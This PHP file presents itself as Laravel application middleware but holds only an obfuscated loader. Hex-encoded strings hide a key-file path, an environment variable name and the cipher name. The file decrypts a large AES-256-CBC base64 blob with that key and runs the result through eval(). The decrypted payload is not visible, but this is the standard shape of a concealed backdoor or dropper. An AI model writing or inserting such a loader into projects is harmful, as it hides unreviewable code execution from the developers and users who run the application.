<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bQIaU6HXdm1FiJnJz4rrKA==');

$c=base64_decode(

'Saz2rnpjn8Ib7DMJKLeWjGaX0YEfLztFwQVEXsF6zRLPEeFEseqwNOOEoFFv025iqp1BqdwJThOc' .
'I1QZ9URQxSzGNn5Nu6fPF9pVWAdJyaXIDm0Av/Um6RyFZ+xkmwnGHOq6EcwY74XVwHzSa8eSiOyV' .
'mjIcF8WFRq5FKvF1Xe2ZX6KYf6eiC0XZgEAHBJ471ob0CcNK0GPLsnd+xruhlIiYJFI5dRgUlPG8' .
'VJpWNljRW5mY+jPnONDIWTRJ9oka8WyIYko9BsHNkaUrE9XWLCzV3ixZG0LgVwml8QVnCbtb2mRI' .
'mDM0/bHJmGoJbFEQFwKnJK7HiRd/OQJjDgVgpAkZSaW1QgXMf7NdiZZ9ZG4XKUS/fg8TeMs7d+nP' .
'c2YoOYGqwl4HViB848ux2reKhEhTuGEJzqLjGMzbhz5h7/kbdSsgkpVejHOjPOetTrX6LXBDtUYK' .
'ChtKP49bINctmgQOS2eDJz2d/PE8jFQjtEDWYoBPK3fTKItVfAVbyIKg34O7YD5hp6HTJpVTpMz7' .
'iMAAZBe5BXHONWCsldiqjS7JDgp51olG1numZ6yLV1ifxtNs5wSdSnftCdHzKcCJdpyWUmc9JoMP' .
'9fZbDPFOUhnkG3XHjSqotJgQpMbFiquaDN/Hq7ub40AESdFwd7ZD7EvRFTvXXhcCBIm8dep5Mg65' .
'1rkWovuaM2Ja4nEUUxru4YBsOcRGJTWg69Mll+QV9MJGjFW7GRWPyuJaxuuCEgsvjxGrPtx/msG5' .
'3ncS6zyAFYX0ey2lSXTSw+A8l4eUtyc/zAXxwM75+tTnH5c4L+gdJpskZ+qnE1RE3xzDPsnm1NmH' .
'fEf9sgmAIf759vrOhgHa4V8V3b/qMCTIw+/cKbGMVXVySz5mjc7tR6OMF9CSXUTDpDBgxCFr+IDp' .
'mQmSEYobWfUCZWbryvPlC4iV1G3GHk9q8r+EwiQm+hEpRu/BE9DvwmTthNnafmpjloCWzgzXdNSE' .
'sXMYBufViKPHgXDr1yV7sCe6weMhE7Zd13CTiVKei03cIAHpiIj4Mx32qXZmfqM/o/UMesTXGJly' .
'acyqYdYO3bOxa6s4pZ4Mmoe3Unm2TKoWjHTrwoMv+lCKKzBfRTMUuSFORQOZkViJWxm9IGE2nqHt' .
'X0Dl1D7coxZEcWnxr03fLjfaEO3V1KrwLne7jFqdU/gciCmqgny0YR7LDuPYvLReAEmBge0A/jlZ' .
'IZDlmFqHuutiBLYHnKTysfHo0YqYp2Te1GdSS8X8d0Uy2/gJ6ZX6lrXeON5x6WlM4X3p3+hdpX4V' .
'7sLSnDq2ROPDBF5GGI075TbfiEUTbdJhvqPPGh4LIPvrHQk79luKmFxkZ2aO6cEVeu5boHVZck1l' .
'XjCBQBdhw8QReUI+eB2Y9nDt1iY1xRsfwvcBj7f+srpLtdfpeg1/xQfRo5HVM/xL6hcSR2ZRYxmO' .
's9IYTz9SrNvq6B51+C6KXdhfuBbB6dXJd9mbQPMruGyyCR07kvRk8YkbvQAYN5tAq+P5Y4GbgQbO' .
'xK+808UJnD5sOMQGuqLF/tO7/k9fTXYqhqnDMczBvayct5836bqepncbQ4kflJ470dwqAGuqHklX' .
'2PB47Ohqyidm3/wQQkD/RpGD6/R2mRMEv5K9e0LsrvA5bWa+xL1gBrNZzEynBJaqdCaID7iMtBf+' .
'btn3m10vNMrM3TYUlnVXHaOjQF0OMFucIhc4oHSr5zfw25w9V2uqBPL7lyBXn03mXKTwNlHGUTWP' .
'YbADBikkSK3Rij7FOkokzBoaWaGxH08fWSXreAC55CIQNb0siK6PeLAiBjNPmbeZj75n/CdcyUxS' .
'yGDHY4+DgR1seoptCzUueOmo26NeGj3G4C4dI8+gsuVXzikNzRMiAffXUuEPCzE4xcrWoNQsW7km' .
'ZXyrROAHuryYqayd4JJvR9PEkE6ZazaYNhPasHpfyK8SXkTbfx1nTHKBJlj8Mtampn4WKLy0mQNI' .
'8XtkjoSBtI3nObgP+/OzeqI7SBJ7MwbLwhSj1OU7vjJIlZWsgcSPcGNjdX9TNI2HTsJ1stNBIxyc' .
'5xK+ropPPLBhOJXnEuJFnnFs9SkaRfr0Zyv2c1iifJbankmxec4aee+y6Y3cc4kiiLntm1j5or7n' .
't/Y+NMTph0lMhcdBYw99wHDvZGNwmQNuIook90zejK/otDOhQKGEDiLE3kL8CVxhekYJ4hB9tKnV' .
'LqoYBDsemFhfI8DrxSVIcBj71yideH4reBAi7S9Ahoox8f3xBIGfXQGJel4XtQKg/1a3xPuQDoZM' .
'PRI5DwlKL1cbRTpkYFX0CKcLl3DuCxInpmPSmhVBp7TOk8LrPP4T4rZ2k1V0drtDzcP/Ty0V5Zso' .
'16oS1HNd6N1OT4iDqZmAXx579YtXPaak5RkpMcYnS27wf6FpHI6gvZfkUwOofv3Avuwsjb+vlXCL' .
'keLELDkUpWn6hcezHHU4VlYjzmd1/0hmOz9yuEx/zKFMkS6w87MtZFqJxiOT8NFIyR0YZPdELtLL' .
'Pg6a2I6mHQbDh8qAMl4iiL2i5rMpFSffJ/i5ysdMRnvZxCq4voG71LGxGaFgxqaksdjTi1KpLWdo' .
'3H1FliTPd8ktxyChPN4abZfLzzxVpYfsrnHpbewRtuQOw08fi/YPNpmb1UVmHANT19RygkdSc37D' .
'6PmBKkN5/jmp1K5vMfcaxXUsxX5H/yhgK1NRzou+ajmBLAMhvNXattstOr5vjaXuEOvSqXhJgoHv' .
'yAC7d1+sZyPI+kp1KZNh/M7w3ufeK2Yj2NvVhiJUhTgBTyoBFr0k+hPZBUXhASNbJqkvzLKieeWQ' .
'CuoBUqd2xaPVtfjGX++uQoEnzJqO69yV6XX2vseJ6pxJi3QLUnRG8IN+o7WUsg7LzNUJJ0qxxNLi' .
'MrH+RirUwNjVhnbn6WBJcUKi7FYkdYDdaDzvn7yXNkvBda6wi+uh33N2i/vfD83eMbY8HH9YSZGH' .
'yHy8hzbv6ne5dzwUN9bPyykDYQugLLB8bkwetZhygHmqgj4cm2sxooc7Wvgnv44W0vFVJb+j2xLa' .
'bswr4mGuGJDQPt1UO2hRv5v0OR2X/c+3dNEHV+79Qao1EOgqJYnrPY9AqYH67gwfgRo9brelRj2e' .
'bLAdMbnKVq7jQ34kC/XoJMN5ufZLZ4sF3e+pk1FskpJ1GQ6nqjRRvB4mKYdfhS7iaFewfbiXAo0n' .
'Sj/oswjJHM5FoYmuw+qPpExvC1VQHarVJlyUGr1ZwX6Xaa898nokvuOGzxZScrMTN55jSG/TW5tI' .
'uJ8UG56nGq638hI6h1SDXDR+wSrBcBB42y600Mw7dFOXC8a/d7GdlBy3q9ksbO2l1G2NNG2XupU0' .
'tTX1pljeasJL4xSR0Gr1+Dj+dGcBJAbL14+MbI+wa6wyF4RkoSbvJYgwKwH4q1u5ct1mNWHjBZ+i' .
'wRweNIRZZH1hmyyiOQKPhLKEys9STjgX/VzeNIPNPaEm9QhNl024ZLOvGi7I1V4pm38PxpZNCeFm' .
'xMXZBagQkOc4hcbr5wj7iCplw8e1KfDl8fkhds5PXNv5nRsrq6ZxPvmk0Bqaaovt5rp277BizDGy' .
'wtxiRaGCY/Y+XlGtaJsJwXm6AbgJcVTQVzYUA0Q/MRiwCZt/Ja1CfjLE5D3NBbhEMFz9Juuo1Ech' .
'XF8Ndf5uZ7AcqJxBfjZPLBkO+Ag6+rkqqreGlOS6kvD/CraygfoVO+AWyRKgI2SxVVTZLAKGWDcv' .
'G2o1XJ2AnaVvsaCBwOtWv/NDm/+4XWhZbTJhawugI51+AS4vRalU8YCnrEbuTJ5s5djKGWyC4A3s' .
'yvoPH6U5RcdDwyIIsi8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

